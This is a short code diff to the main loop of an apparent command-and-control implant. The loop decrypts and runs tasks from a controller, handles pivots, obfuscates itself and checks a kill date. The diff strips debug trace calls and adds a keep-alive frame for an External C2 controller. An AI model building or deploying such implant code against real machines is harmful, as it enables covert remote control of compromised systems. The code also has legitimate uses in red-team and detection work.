@@ -165,25 +165,20 @@ void client_process() {
 
 	while (TRUE) {
 		/* wait for data to be available (and obfuscate our agent if gargling is enabled) */
-		bc("wait", 0, 0);
 		LCHANNEL_WAIT(server);
-		bc("wait-done", 0, 0);
 
 		/* read from the connection */
 		length = LCHANNEL_READ_FRAME(server, client_read_buffer, MAX_GET);
-		bc("read", length, 0);
 		if (length < 0) {
 			return;
 		}	
 
 		if (length > 0) {
 			length = security_decrypt(client_read_buffer, length);
-			bc("dec", length, 0);
 			/* keep-alive guard, see client_write() */
 			if (length >= 4) {
 				process_payload(client_read_buffer, length);
-				bc("task-done", length, 0);
-			}
+				}
 		}
 
 		pivot_poll(command_shell_callback);
@@ -194,6 +189,11 @@ void client_process() {
 		/* check the kill date */
 		if (check_kill_date())
 			command_die(command_shell_callback);
+
+		/* emit a zero-length frame so the parent (an External C2 controller,
+		 * or a pivot parent) sees we are alive and advances its loop; the
+		 * official beacon does the same from its flush stage. */
+		LCHANNEL_WRITE_FRAME(server, (char *)"", 0);
 
 		client_flush();
 
